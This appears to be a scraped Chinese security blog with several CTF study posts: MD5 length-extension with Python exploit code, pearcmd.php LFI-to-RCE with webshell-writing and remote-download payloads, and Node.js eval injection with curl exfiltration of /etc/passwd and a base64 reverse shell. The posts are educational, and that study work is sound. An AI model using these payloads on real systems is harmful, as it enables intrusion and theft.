这里十六进制与448模512不同余，需补位满足二进制长度位512的倍数，补位后的数据如下： 十六进制： 0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000 这里后面补充8是因为：补位时二进制第一位要补1，那么1000转换成16进制就是8，后面都补上0 以十六进制表示一共是128个字符，十六进制每个字符能够转换成4位二进制，128*4=512这就是一组，正好是512bit。 并且可以看到上述最后二十个字符是以20开头的，这或许是由于我们md5采用32位加密，故test为4*8=32，而32的十六进制就是20 即：最后四字节也就是2000000000000000代表前面’test’的长度 二进制： 0b1110100011001010111001101110100100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000 将补位后的数据进行一次复杂的运算，计算出 A=0xcd6b8f09 B=0x73d32146 C=0x834edeca D=0xf6b42726 数据小于512位，所以将ABCD通过小端规则转换就是MD5值：098f6bcd4621d373cade4e832627b4f6 小端规则： 数据的高位字节存放在地址的高端 低位字节存放在地址低端，比如十六进制的后16位（64/4）是32，表示信息长度是32位，就是2000000000000000； 如果我输入的数据不是test而是一串很长的字符，换算出来大于512小于1024，就需要计算两次，第一次先计算前512位的ABCD的值，算出来后再用这个ABCD去计算后面512位的的ABCD的值，最后算出来的ABCD经过拼接就是这串字符的MD5了 这里还是有点懵逼的，于是直接看题目来感受吧。 0x04 md5的hash扩展攻击 4.1 解决的问题 如文章最初遇到的问题，由两个字符串组成一个字符串$str=$a+$b，第一个字符串$a不知道也不可控，只可控第二个字符串$b，同时知道第一个字符串$a的MD5值和长度，这时候将第二个字符串精心构造一下，便可以算出合成的字符串$str的MD5的值 4.2 攻击原理 要明白攻击的原理，需要对md5计算方法稍微了解一下，就是上边的几个步骤，我们先来看一下以上问题正常计算的步骤。 4.2.1 正常的计算步骤 假如第一个字符串$a=“test”,为了方便转为十六进制0x74657374 构造第二个字符串首先手动将$str补成一个标准的可以直接计算的512位 $str=0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000 这样子，这时候再在后面追加一个0x746573748 $str=0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000746573748 这时候再将$str大于512位，程序会先将这串数据补为1024位，补充完如下 $str=0x7465737480000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000074657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 这时将$str分为两部分 74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000 和 74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 这时候程序计算前一部分的ABCD的值，由于和之前算的test的数值是相同的所以 A=0xcd6b8f09 B=0x73d32146 C=0x834edeca D=0xf6b42726 到了第二部分，第二部分的计算是用的第一部分的ABCD去计算，计算新的ABCD如下 A=0x226359e5 b=0x99df12eb C=0x6853f59e D=0xf5406385 最后算出来的MD5是e5596322eb12df999ef55368856340f5 4.2.2 发现问题 我们看到了，将原数据按长度拆分后，第一轮计算的结果会作为幻数用在第二轮计算中。而在我们的问题中，第一轮计算的结果我们是已知的，也就是说，我们知道了第二轮计算的幻数，可以进行接下来的运算。 因为知道了第一个字符串$a的长度，我们可以构造第二个字符串$b的值，也就是说我们手动在第二个字符串$b的前端添加一些特定数据，使得第一轮计算因为我们添加数据后符合一轮计算的原数据长度而只计算出第一个字符串的hash值。这样我们就可以利用这个结果作为我们二轮计算的幻数进行下面的计算，从而预测最终的md结果。 具体的操作步骤看一下例子。 我们作为攻击者来复现一下刚才正常计算的那个过程。 知道的条件 1.$a的MD5(098f6bcd4621d373cade4e832627b4f6) 2.$a的长度=4 3.$b我们可以任意控制 由1我们可以逆推算出其ABCD的值 A=0xcd6b8f09 B=0x73d32146 C=0x834edeca D=0xf6b42726 我们构造$b的值，在前面添加特定长度的补全值： $b='\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00'+'test' 其中\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00这一类的数据是在md5计算的补位过程中填充的数据，我们手动来填充一下，长度视已知的$a的长度=4决定。 此时$str如下，由于不知道$a，我们假设$a=“aaaa” $str='aaaa'+'\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00'+'test' 计算str的过程 1.由于大于512位，先补全为1024位， 2.将其分为两部分 3.计算第一部分的ABCD的值 4.再用第一部分算出来的ABCD拿来算第二部分的值。 这里由于第一部分的ABCD我们可以逆推出来，我们可以直接跳过前三部分直接进行第四部分的计算，只需要将标准的MD5的源码里面的初始的ABCD的值改为逆推出来的那个值 我们用假的初始的ABCD计算一下 0x74657374800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002002000000000000 得到MD5，发现是e5596322eb12df999ef55368856340f5，和上面正向计算出来的一样！ 到此，md5的hash扩展攻击结束。 0x05 CTF实例 这里也懒得找环境了，就直接看着代码分析吧 &lt;?php $flag = \"flag{flag is here}\"; $secret = \"aaaaabbbbbccccc\"; // This secret is 15 characters long for security! @$username = $_POST[\"username\"]; @$password = $_POST[\"password\"]; if (!empty($_COOKIE[\"getmein\"])) { if (urldecode($username) === \"admin\" &amp;&amp; urldecode($password) != \"admin\") { if ($_COOKIE[\"getmein\"] === md5($secret . urldecode($username . $password))) { echo \"Congratulations! You are a registered user. \"; die (\"The flag is \". $flag); } else { die (\"Your cookies don't match up! STOP HACKING THIS SITE.\"); } } else { die (\"You are not an admin! LEAVE.\"); } } setcookie(\"sample-hash\", md5($secret . urldecode(\"admin\" . \"admin\")), time() + (60 * 60 * 24 * 7)); if (empty($_COOKIE[\"source\"])) { setcookie(\"source\", 0, time() + (60 * 60 * 24 * 7)); } else { if ($_COOKIE[\"source\"] != 0) { echo \"\"; // This source code is outputted here } } ?&gt; 通过阅读源码，我们可以知道，如果想要得到flag，需要几个条件： cookei字段的getmein不能为空 发送过去的username = admin，并且，password != admin getmein的值 = $secret + $username + $password 的md5值 前两个条件都很容易满足，关键是第三个，因为我们不知道$secret的内容，只知道长度为15，不过继续阅读后面的内容，可以获得一个信息是： md5($secret + adminadmin)已知，也就是请求头中的sample-hash 那么， 如果 $username = admin，$password = adminwn，则问题则转化成： 已知md5(‘xxxxxxxxxxxxxxxadminadmin’)，求md5(‘xxxxxxxxxxxxxxxadminadminwn’)的值，然后只要把该值赋给getmein即可。综上，可以利用md5扩展长度攻击。 由于md5算法较为复杂，我使用了一个工具hashpump： 附上安装方法： git clone https://github.com/bwall/HashPump apt-get install g++ libssl-dev cd HashPump make make install 用法： 输入已知的字符串和md5结果（在这里是adminadmin和571580b26c65f306376d4f64e53cb5c7），输入密钥的长度（15)，再输入你想要在后面添加的字符串，它会自动给你返回md5后的结果，以及填充数据： 把数据在burpsuite中填入后重发即可得到flag。 0x06 代码实现 这里附上实现源码 my_md5.py #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author：DshtAnger # theory reference: # blog： # http://blog.csdn.net/adidala/article/details/28677393 # http://blog.csdn.net/forgotaboutgirl/article/details/7258109 # http://blog.sina.com.cn/s/blog_6fe0eb1901014cpl.html # RFC1321： # https://www.rfc-editor.org/rfc/pdfrfc/rfc1321.txt.pdf ############################################################################## import sys def genMsgLengthDescriptor(msg_bitsLenth): ''' ---args: msg_bitsLenth : the bits length of raw message --return: 16 hex-encoded string , i.e.64bits,8bytes which used to describe the bits length of raw message added after padding ''' return __import__(\"struct\").pack(\"&gt;Q\",msg_bitsLenth).encode(\"hex\") def reverse_hex_8bytes(hex_str): ''' --args: hex_str: a hex-encoded string with length 16 , i.e.8bytes --return: transform raw message descriptor to little-endian ''' hex_str = \"%016x\"%int(hex_str,16) assert len(hex_str)==16 return __import__(\"struct\").pack(\"&lt;Q\",int(hex_str,16)).encode(\"hex\") def reverse_hex_4bytes(hex_str): ''' --args: hex_str: a hex-encoded string with length 8 , i.e.4bytes --return: transform 4 bytes message block to little-endian ''' hex_str = \"%08x\"%int(hex_str,16) assert len(hex_str)==8 return __import__(\"struct\").pack(\"&lt;L\",int(hex_str,16)).encode(\"hex\") def deal_rawInputMsg(input_msg): ''' --args: input_msg : inputed a ascii-encoded string --return: a hex-encoded string which can be inputed to mathematical transformation function. ''' ascii_list = [x.encode(\"hex\") for x in input_msg] length_msg_bytes = len(ascii_list) length_msg_bits = len(ascii_list)*8 #padding ascii_list.append('80') while (len(ascii_list)*8+64)%512 != 0: ascii_list.append('00') #add Descriptor ascii_list.append(reverse_hex_8bytes(genMsgLengthDescriptor(length_msg_bits))) return \"\".join(ascii_list) def getM16(hex_str,operatingBlockNum): ''' --args: hex_str : a hex-encoded string with length in integral multiple of 512bits operatingBlockNum : message block number which is being operated , greater than 1 --return: M : result of splited 64bytes into 4*16 message blocks with little-endian ''' M = [int(reverse_hex_4bytes(hex_str[i:(i+8)]),16) for i in xrange(128*(operatingBlockNum-1),128*operatingBlockNum,8)] return M #定义函数，用来产生常数T[i]，常数有可能超过32位，同样需要&amp;0xffffffff操作。注意返回的是十进制的数 def T(i): result = (int(4294967296*abs(__import__(\"math\").sin(i))))&amp;0xffffffff return result #定义每轮中用到的函数 #RL为循环左移，注意左移之后可能会超过32位，所以要和0xffffffff做与运算，确保结果为32位 F = lambda x,y,z:((x&amp;y)|((~x)&amp;z)) G = lambda x,y,z:((x&amp;z)|(y&amp;(~z))) H = lambda x,y,z:(x^y^z) I = lambda x,y,z:(y^(x|(~z))) RL = L = lambda x,n:(((x&lt;&lt;n)|(x&gt;&gt;(32-n)))&amp;(0xffffffff)) def FF(a, b, c, d, x, s, ac): a = (a+F ((b), (c), (d)) + (x) + (ac)&amp;0xffffffff)&amp;0xffffffff; a = RL ((a), (s))&amp;0xffffffff; a = (a+b)&amp;0xffffffff return a def GG(a, b, c, d, x, s, ac): a = (a+G ((b), (c), (d)) + (x) + (ac)&amp;0xffffffff)&amp;0xffffffff; a = RL ((a), (s))&amp;0xffffffff; a = (a+b)&amp;0xffffffff return a def HH(a, b, c, d, x, s, ac): a = (a+H ((b), (c), (d)) + (x) + (ac)&amp;0xffffffff)&amp;0xffffffff; a = RL ((a), (s))&amp;0xffffffff; a = (a+b)&amp;0xffffffff return a def II(a, b, c, d, x, s, ac): a = (a+I ((b), (c), (d)) + (x) + (ac)&amp;0xffffffff)&amp;0xffffffff; a = RL ((a), (s))&amp;0xffffffff; a = (a+b)&amp;0xffffffff return a def show_md5(A,B,C,D): return \"\".join( [ \"\".join(__import__(\"re\").findall(r\"..\",\"%08x\"%i)[::-1]) for i in (A,B,C,D) ] ) def run_md5(A=0x67452301,B=0xefcdab89,C=0x98badcfe,D=0x10325476,readyMsg=\"\"): a = A b = B c = C d = D for i in xrange(0,len(readyMsg)/128): M = getM16(readyMsg,i+1) for i in xrange(16): exec \"M\"+str(i)+\"=M[\"+str(i)+\"]\" #First round a=FF(a,b,c,d,M0,7,0xd76aa478L) d=FF(d,a,b,c,M1,12,0xe8c7b756L) c=FF(c,d,a,b,M2,17,0x242070dbL) b=FF(b,c,d,a,M3,22,0xc1bdceeeL) a=FF(a,b,c,d,M4,7,0xf57c0fafL) d=FF(d,a,b,c,M5,12,0x4787c62aL) c=FF(c,d,a,b,M6,17,0xa8304613L) b=FF(b,c,d,a,M7,22,0xfd469501L) a=FF(a,b,c,d,M8,7,0x698098d8L) d=FF(d,a,b,c,M9,12,0x8b44f7afL) c=FF(c,d,a,b,M10,17,0xffff5bb1L) b=FF(b,c,d,a,M11,22,0x895cd7beL) a=FF(a,b,c,d,M12,7,0x6b901122L) d=FF(d,a,b,c,M13,12,0xfd987193L) c=FF(c,d,a,b,M14,17,0xa679438eL) b=FF(b,c,d,a,M15,22,0x49b40821L) #Second round a=GG(a,b,c,d,M1,5,0xf61e2562L) d=GG(d,a,b,c,M6,9,0xc040b340L) c=GG(c,d,a,b,M11,14,0x265e5a51L) b=GG(b,c,d,a,M0,20,0xe9b6c7aaL) a=GG(a,b,c,d,M5,5,0xd62f105dL) d=GG(d,a,b,c,M10,9,0x02441453L) c=GG(c,d,a,b,M15,14,0xd8a1e681L) b=GG(b,c,d,a,M4,20,0xe7d3fbc8L) a=GG(a,b,c,d,M9,5,0x21e1cde6L) d=GG(d,a,b,c,M14,9,0xc33707d6L) c=GG(c,d,a,b,M3,14,0xf4d50d87L) b=GG(b,c,d,a,M8,20,0x455a14edL) a=GG(a,b,c,d,M13,5,0xa9e3e905L) d=GG(d,a,b,c,M2,9,0xfcefa3f8L) c=GG(c,d,a,b,M7,14,0x676f02d9L) b=GG(b,c,d,a,M12,20,0x8d2a4c8aL) #Third round a=HH(a,b,c,d,M5,4,0xfffa3942L) d=HH(d,a,b,c,M8,11,0x8771f681L) c=HH(c,d,a,b,M11,16,0x6d9d6122L) b=HH(b,c,d,a,M14,23,0xfde5380c) a=HH(a,b,c,d,M1,4,0xa4beea44L) d=HH(d,a,b,c,M4,11,0x4bdecfa9L) c=HH(c,d,a,b,M7,16,0xf6bb4b60L) b=HH(b,c,d,a,M10,23,0xbebfbc70L) a=HH(a,b,c,d,M13,4,0x289b7ec6L) d=HH(d,a,b,c,M0,11,0xeaa127faL) c=HH(c,d,a,b,M3,16,0xd4ef3085L) b=HH(b,c,d,a,M6,23,0x04881d05L) a=HH(a,b,c,d,M9,4,0xd9d4d039L) d=HH(d,a,b,c,M12,11,0xe6db99e5L) c=HH(c,d,a,b,M15,16,0x1fa27cf8L) b=HH(b,c,d,a,M2,23,0xc4ac5665L) #Fourth round a=II(a,b,c,d,M0,6,0xf4292244L) d=II(d,a,b,c,M7,10,0x432aff97L) c=II(c,d,a,b,M14,15,0xab9423a7L) b=II(b,c,d,a,M5,21,0xfc93a039L) a=II(a,b,c,d,M12,6,0x655b59c3L) d=II(d,a,b,c,M3,10,0x8f0ccc92L) c=II(c,d,a,b,M10,15,0xffeff47dL) b=II(b,c,d,a,M1,21,0x85845dd1L) a=II(a,b,c,d,M8,6,0x6fa87e4fL) d=II(d,a,b,c,M15,10,0xfe2ce6e0L) c=II(c,d,a,b,M6,15,0xa3014314L) b=II(b,c,d,a,M13,21,0x4e0811a1L) a=II(a,b,c,d,M4,6,0xf7537e82L) d=II(d,a,b,c,M11,10,0xbd3af235L) c=II(c,d,a,b,M2,15,0x2ad7d2bbL) b=II(b,c,d,a,M9,21,0xeb86d391L) A += a B += b C += c D += d A = A&amp;0xffffffff B = B&amp;0xffffffff C = C&amp;0xffffffff D = D&amp;0xffffffff a = A b = B c = C d = D print \"%x,%x,%x,%x\"%(a,b,c,d) return show_md5(a,b,c,d) test.py # -*- coding: utf-8 -*- import my_md5 import sys import six MD5_Hash=sys.argv[1] length=int(sys.argv[2]) text=sys.argv[3] s1=eval('0x'+MD5_Hash[:8].decode('hex')[::-1].encode('hex')) s2=eval('0x'+MD5_Hash[8:16].decode('hex')[::-1].encode('hex')) s3=eval('0x'+MD5_Hash[16:24].decode('hex')[::-1].encode('hex')) s4=eval('0x'+MD5_Hash[24:32].decode('hex')[::-1].encode('hex')) secret = \"a\"*length test=secret+'\\x80'+'\\x00'*((512-length*8-8-8*8)/8)+six.int2byte(length*8)+'\\x00\\x00\\x00\\x00\\x00\\x00\\x00'+text s = my_md5.deal_rawInputMsg(test) r = my_md5.deal_rawInputMsg(secret) inp = s[len(r):] print '填充完的数据为:'+test+' ' print '----------------------------------------------------------' print '扩充完的数据为(16进制):'+s print '----------------------------------------------------------' print '截取最后分组的数据(16进制):'+inp print '----------------------------------------------------------' print '最终填充结果为:'+bytes(test).encode('hex') print \"填充后的md5为:\"+my_md5.run_md5(s1,s2,s3,s4,inp) 0x07 参考文章 MD5的Hash长度扩展攻击 Hash拓展长度攻击原理剖析 MD5扩展长度攻击（实验吧 —— 让我进去）","tags":["基本知识"],"categories":["web知识总结"]},{"title":"浅析pearcmd.php漏洞","path":"/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/","content":"0x01 环境准备 安装php apt-get install php7.4 安装pear apt-get install php-pear 不过这里搭环境有点费劲，最终还是选择docker吧，这里直接拉取php-7.4:apache运行即可 0x02 前置知识 pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的； 在7.4及以后，需要我们在编译PHP的时候指定–with-pear才会安装。在命令行下可以用pear或php /usr/local/lib/php/pearcmd.php运行，虽然不是在web的目录下，但是如果存在文件包含漏洞，我们就可以运行这个命令行工具 不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在/usr/local/lib/php。 要利用这个pearcmd.php需要满足几个条件： （1）.要开启register_argc_argv这个选项在Docker中是自动开启的 （2）.要有文件包含的利用 我们再来看一下pearcmd.php可以接受哪些命令 Commands: build Build an Extension From C Source bundle Unpacks a Pecl Package channel-add Add a Channel channel-alias Specify an alias to a channel name channel-delete Remove a Channel From the List channel-discover Initialize a Channel from its server channel-info Retrieve Information on a Channel channel-login Connects and authenticates to remote channel server channel-logout Logs out from the remote channel server channel-update Update an Existing Channel clear-cache Clear Web Services Cache config-create Create a Default configuration file config-get Show One Setting config-help Show Information About Setting config-set Change Setting config-show Show All Settings convert Convert a package.xml 1.0 to package.xml 2.0 format cvsdiff Run a \"cvs diff\" for all files in a package cvstag Set CVS Release Tag download Download Package download-all Downloads each available package from the default channel info Display information about a package install Install Package list List Installed Packages In The Default Channel list-all List All Packages list-channels List Available Channels list-files List Files In Installed Package list-upgrades List Available Upgrades login Connects and authenticates to remote server [Deprecated in favor of channel-login] logout Logs out from the remote server [Deprecated in favor of channel-logout] makerpm Builds an RPM spec file from a PEAR package package Build Package package-dependencies Show package dependencies package-validate Validate Package Consistency pickle Build PECL Package remote-info Information About Remote Packages remote-list List Remote Packages run-scripts Run Post-Install Scripts bundled with a package run-tests Run Regression Tests search Search remote package database shell-test Shell Script Test sign Sign a package distribution file svntag Set SVN Release Tag uninstall Un-install Package update-channels Update the Channel List upgrade Upgrade Package upgrade-all Upgrade All Packages [Deprecated in favor of calling upgrade with no parameters] Usage: pear [options] command [command-options] &lt;parameters&gt; Type \"pear help options\" to list all options. Type \"pear help shortcuts\" to list all command shortcuts. Type \"pear help version\" or \"pear version\" to list version information. Type \"pear help &lt;command&gt;\" to get the help for the specified command. 2.1 原理 php的pear扩展是一个命令行扩展管理工具，默认的安装路径在/usr/local/lib/php/pearcmd.php，在命令行下可以用pear或php /usr/local/lib/php/pearcmd.php运行，虽然不是在web的目录下，但是如果存在文件包含漏洞，我们就可以运行这个命令行工具 我们再来看register_argc_argv选项，在这个选项字段如果选了ON的话，URL中?后面的内容会全部传入至$_SERVER['argv']这个变量内，无论后面的内容是否有等号。 pear会在pearcmd.php获取命令行参数 // 这一行代码设置 PEAR 命令的前端类型为 CLI。这意味着接下来的 PEAR 命令将在命令行界面中执行。 PEAR_Command::setFrontendType('CLI'); //这一行获取所有可用的 PEAR 命令 $all_commands = PEAR_Command::getCommands(); //读取 PHP 的命令行参数，并将其存储在 $argv 变量中。这是为了获取用户在命令行中输入的参数。 $argv = Console_Getopt::readPHPArgv(); // fix CGI sapi oddity - the -- in pear.bat/pear is not removed if (php_sapi_name() != 'cli' &amp;&amp; isset($argv[1]) &amp;&amp; $argv[1] == '--') { unset($argv[1]); $argv = array_values($argv); } 上面的if代码块处理 CGI sapi 的特殊情况。如果当前的 PHP 运行环境不是 CLI（Command Line Interface），并且 $argv 中的第二个参数是 '--'，则移除这个 '--' 参数。这可能是为了处理在 CGI 环境下调用 PEAR 命令时的一些特殊情况。 而pear获取命令行参数的函数Consoles/Getopt.php-&gt;readPHPArgv()中 public static function readPHPArgv() { global $argv; if (!is_array($argv)) { if (!@is_array($_SERVER['argv'])) { if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) { $msg = \"Could not read cmd args (register_argc_argv=Off?)\"; return PEAR::raiseError(\"Console_Getopt: \" . $msg); } return $GLOBALS['HTTP_SERVER_VARS']['argv']; } return $_SERVER['argv']; } return $argv; } 会先尝试$argv变量（这个变量储存在命令行模式下运行php脚本时传入的参数），然后再尝试$_SERVER['argv']变量，$_SERVER['argv']为我们可控的变量，这样，在文件包含的场景下，我们就可以运行pear命令行工具并用GET请求参数控制pear的命令行参数了。 $_SERVER[‘argv’]所获取的数组，就是在命令行模式下argv[0]是脚本名，后边依次为参数 2.2 register_argc_argv php.ini默认为off，（当下载的php中不存在php.ini时，默认为On)。 cli模式 不需要开启php.ini，即可通过$_SERVER[‘argv’]获取命令行参数，和cmd一样 web模式 在web模式下必须在php.ini开启register_argc_argv配置项 设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果 这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’] cli模式下的argv在web模式下不适用 该变量是对queryString以+号进行切割，而不是&amp; 2.3 register_argc_argv和pear的联系 #!/bin/sh # first find which PHP binary to use if test \"x$PHP_PEAR_PHP_BIN\" != \"x\"; then PHP=\"$PHP_PEAR_PHP_BIN\" else if test \"/usr/bin/php\" = '@'php_bin'@'; then PHP=php else PHP=\"/usr/bin/php\" fi fi # then look for the right pear include dir if test \"x$PHP_PEAR_INSTALL_DIR\" != \"x\"; then INCDIR=$PHP_PEAR_INSTALL_DIR INCARG=\"-d include_path=$PHP_PEAR_INSTALL_DIR\" else if test \"/usr/share/php\" = '@'php_dir'@'; then INCDIR=`dirname $0` INCARG=\"\" else INCDIR=\"/usr/share/php\" INCARG=\"-d include_path=/usr/share/php\" fi fi exec $PHP -C -q $INCARG -d date.timezone=UTC -d output_buffering=1 -d variables_order=EGPCS -d open_basedir=\"\" -d safe_mode=0 -d register_argc_argv=\"On\" -d auto_prepend_file=\"\" -d auto_append_file=\"\" $INCDIR/pearcmd.php \"$@\" pear本质上就是个sh文件，上面是文件内容。 重点就是当执行了pear时，会将$_SERVER[‘argv’]当作参数一起执行，从而自动拉取了指定的php文件 2.4 利用方法 当有存在有限制的文件包含漏洞时，利用该漏洞，先远程拉取恶意文件到/tmp等权限要求低的目录下，再利用文件包含 利用前提 1.开启了register_argc_argv 2.要有pear管理包 3.无basedir的限制 4.允许包含php文件 0x03 漏洞利用 下面是测试文件代码 &lt;?php include($_GET['file']); ?&gt; 这其中的file参数就是用来包含pearcmd.php文件的，以便可以将我们的恶意命令接受并执行 3.1 config-create 此方法来自于p神博客 此命令的参数和用法如下： config-create: must have 2 parameters, root path and filename to save as 阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。 可以直接往web目录写入webshell，也可以往/tmp/目录写入任意文件名任意内容，然后通过文件包含去包含，在docker环境中pcel/pear都会被默认安装，安装的路径在/usr/local/lib/php（但不同系统的路径可能不同） 尝试一下使用以下这个命令看下效果 pear config-create /114514whatever /tmp/test.txt 不过这里疑惑为何test.txt文件内容是这样的，在阅读了上述p神的文章发现，这里估计是在执行第一个参数后所产生的结果被序列化存储了（估计是session文件）之后被我们的命令行放入到了test.txt文件中而已。 那根据上面我们知道第一个参数的内容会被写入文件，如果我们将第一个参数换成文件内容的话我们就可以写入可包含的文件了 payload： ?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST['cmd']);?&gt;+/tmp/test.php 蚁剑连接看看，如下图成功链接 我们来看下写入的文件 可以看见/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST['cmd']);?&gt;整个被作为参数传入了命令行，但是get参数 file被正常解析了，这是因为前面说过的即使URL中存在等号，问号后的内容一样会被传入$_SERVER['argv'] 3.2 install 此方法来自jrXnm师傅的博客 先来看看install的常规用法：vps上挂了一个php文件 &lt;?php phpinfo(); ?&gt; 然后通过pear下载 pear install http://[vps]:[port]/flag.php 结果： 可以看到成功下载 结果在/tmp/pear/download/目录下有一个flag.php 然后install有--installroot这个选项可以指定他的安装目录，这里可以构造payload远程下载我们的文件了 http://localhost:3354/?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://[vps]:[port]/flag.php 如上图成功包含 3.3 download 先查看一下download的用法 pear download [option] [package] #这里的option只有一个-Z, --nocompress，下载一个未压缩的tar包 尝试一下下恶意的php文件 虽然提示下载错误，但是在当前目录下直接留下了恶意文件。 我们可以尝试一下利用这个download 我构造的payload为 ?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://vps/shell.php 然后直接访问shell，成功 ?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://vps/shell.php 0x04 过滤percmd 如果pearcmd关键词被ban怎么半，其实可以用peclcmd.php来代替，在这个php文件当中其实就是引入了pearcmd.php if ('/www/server/php/52/lib/php' != '@'.'include_path'.'@') { ini_set('include_path', '/www/server/php/52/lib/php'); $raw = false; } else { // this is a raw, uninstalled pear, either a cvs checkout, or php distro $raw = true; } define('PEAR_RUNTYPE', 'pecl'); require_once 'pearcmd.php'; 0x05 参考文章 关于利用pearcmd进行文件包含的一些总结 Docker PHP裸文件本地包含综述 – p神！ [web安全] 利用pearcmd.php从LFI到getshell 文件包含之Pearcmd.php的利用 关于pearcmd利用总结 [LFI包含pearcmd命令执行学习]","tags":["基本知识"],"categories":["web知识总结"]},{"title":"JavaScript原型链污染学习","path":"/2023/10/29/javascript-yuan-xing-lian-wu-ran/","content":"0x01 前言 最近新生赛老是碰到JavaScript原型链题目，我纳闷儿呢，这玩意儿也算新生难度了？？？┭┮﹏┭┮终究是我太菜了。话不多说，直接开卷！！！以下几乎都是转载的参考文章，请见谅┭┮﹏┭┮ 0x02 危险函数所导致的命令执行 2.1 eval() eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。和PHP中eval函数一样，如果传递到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。 简单例子：main.js var express = require(\"express\"); var app = express(); app.get('/eval',function(req,res){ res.send(eval(req.query.q)); console.log(req.query.q); }) var server = app.listen(8888, function() { console.log(\"应用实例，访问地址为 http://127.0.0.1:8888/\"); }) 漏洞利用： Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造require('child_process').exec('');来进行调用。 弹计算器(windows)： /eval?q=require('child_process').exec('calc'); 读取文件(linux)： /eval?q=require('child_process').exec('curl -F \"x=`cat /etc/passwd`\" http://vps');; 反弹shell(linux)： /eval?q=require('child_process').exec('echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx|base64 -d|bash'); YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx是bash -i &gt;&amp; /dev/tcp/127.0.0.1/3333 0&gt;&amp;1 BASE64加密后的结果，直接调用会报错。 注意：BASE64加密后的字符中有一个+号需要url编码为%2B(一定情况下) 如果上下文中没有require(类似于Code-Breaking 2018 Thejs)，则可以使用global.process.mainModule.constructor._load('child_process').exec('calc')来执行命令 paypal一个命令执行的例子： demo.paypal.com] Node.js code injection (RCE) (使用数组绕过过滤，再调用child_process执行命令) 2.2 类似命令 间隔两秒执行函数： setInteval(some_function, 2000) 两秒后执行函数： setTimeout(some_function, 2000); some_function处就类似于eval函数的参数 输出HelloWorld： Function(“console.log(‘HelloWolrd’)”)() 类似于php中的create_function 以上都可以导致命令执行 0x03 JavaScript类 3.1 类的声明 下面是一个基本的 JavaScript 类的声明 class Calculator { constructor(num) { this.num = num } applyAdd(op) { this.num += op return this } applySub(op) { this.num -= op return this } static add(num1, num2) { return num1 + num2 } static sub(num1, num2) { return num1 - num2 } } 然后我们创建类的实例 let calc = new Calculator(1) console.log(calc.num) console.log(calc.applyAdd(2).num) console.log(Calculator.sub(11, 5)) 基于我们在其它编程语言的习惯，上面的代码非常易于理解 上述代码中，num称为类Calculator的属性，applyAdd、applySub称为类Calculator的方法，add、sub称为类Calculator的静态方法 在 ES6 之前，JavaScript 并没有提供 class 语法，类的功能是基于函数（function）来实现的，如下 // 创建类 function Calculator(num) { this.num = num } Calculator.prototype.applyAdd = function (op) { this.num += op return this } Calculator.prototype.applySub = function (op) { this.num -= op return this } Calculator.add = function (num1, num2) { return num1 + num2 } Calculator.sub = function (num1, num2) { return num1 - num2 } // 创建实例 let calc = new Calculator(1) console.log(calc.num) console.log(calc.applyAdd(2).num) console.log(Calculator.sub(11, 5)) 现在我们注意下面几个细节 用函数实现时，function Calculator的内容（参数、函数体）与用类实现时的constructor相同 用函数实现时，方法applyAdd、applySub声明在Calculator.prototype层中 用函数实现时，静态方法add、sub直接声明在Calculator层中 3.2 new 做了什么 可以说 JavaScript 的任何一个对象都是一个 Object，不论是Number``String``Array等，它们都具有一种 JSON 结构（注意，JavaScript 中含有JSON类，此处的 JSON 